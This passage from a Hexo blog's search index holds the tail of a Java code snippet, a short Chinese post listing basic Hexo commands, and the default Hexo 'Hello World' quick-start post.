//利用第一次返回isSold为ture来区分第几次调用</span><br><span class="line">    if(isSold)</span><br><span class="line">      return 99;</span><br><span class="line">    else</span><br><span class="line">      return 100;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my fist blog</title>
      <link href="/2024/08/01/my-fist-blog/"/>
      <url>/2024/08/01/my-fist-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="先进入blog-cd-blog"><a href="#先进入blog-cd-blog" class="headerlink" title="先进入blog         cd blog"></a>先进入blog         cd blog</h2><h2 id="预览hexo-hexo-s"><a href="#预览hexo-hexo-s" class="headerlink" title="预览hexo             hexo s"></a>预览hexo             hexo s</h2><h2 id="创建文章题目-hexo-new-“”"><a href="#创建文章题目-hexo-new-“”" class="headerlink" title="创建文章题目        hexo new “”"></a>创建文章题目        hexo new “”</h2><h2 id="进入文章目录-cd-提目前，blog后的东西）题目-md"><a href="#进入文章目录-cd-提目前，blog后的东西）题目-md" class="headerlink" title="进入文章目录        cd   (提目前，blog后的东西）题目.md"></a>进入文章目录        cd   (提目前，blog后的东西）题目.md</h2><h2 id="写文章-notepad-题目-md"><a href="#写文章-notepad-题目-md" class="headerlink" title="写文章                  notepad 题目.md"></a>写文章                  notepad 题目.md</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/01/hello-world/"/>
      <url>/2024/08/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
